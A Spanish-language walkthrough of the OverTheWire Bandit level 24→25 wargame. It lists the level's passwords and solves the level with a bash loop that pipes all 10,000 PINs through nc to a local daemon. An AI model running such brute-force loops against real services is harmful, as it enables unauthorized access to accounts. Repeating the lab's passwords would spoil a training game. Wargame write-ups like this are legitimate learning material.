## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
## Datos de Acceso al Nivel
- **Puerto:** 2220
##### Se usará el usuario "bandit24":
- **Usuario:** bandit24
- **Contraseña:** gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
##### Después de conseguir la contraseña:
- **Usuario:** bandit25
- **Contraseña descubierta:** iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
## Solución
```
bandit24@bandit:~$ for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i ; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

- ##### Cierre de sesión del usuario "bandit24".
```
bandit24@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
```
## Notas Adicionales
- **grep - v mensaje** - Filtra todas las líneas que no contenga el mensaje.
## Referencias
- [OverTheWire](https://overthewire.org/wargames/bandit/bandit1.html)